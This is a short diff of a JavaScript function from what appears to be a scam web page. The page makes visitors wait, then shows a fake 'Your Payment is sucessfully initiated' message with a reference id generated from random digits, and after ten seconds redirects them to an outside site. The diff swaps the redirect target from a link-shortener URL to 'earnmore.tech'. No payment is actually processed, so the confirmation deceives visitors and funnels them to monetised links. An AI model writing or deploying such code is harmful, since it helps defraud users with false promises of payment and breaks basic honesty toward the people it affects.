@@ -27,7 +27,7 @@ function sucess(){
       document.getElementById('questions').innerHTML = "<center><p class='topic'>Please bear with us for 20 seconds more <br><br>we sre checking your information before proceding <br><br>Wait for 20 Seconds</p></center>";
      setTimeout(function(){
        document.getElementById('questions').innerHTML = `<center><p class='topic'>Your Payment is sucessfully initiated and amount will reflect in the respsctive method within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span></center>`;
-       setTimeout(function(){window.location = "http://fumacrom.com/MJif"}, 10000);
+       setTimeout(function(){window.location = "http://earnmore.tech"}, 10000);
      }, 20000);
      let result = '';
      let nums = '0123456789';
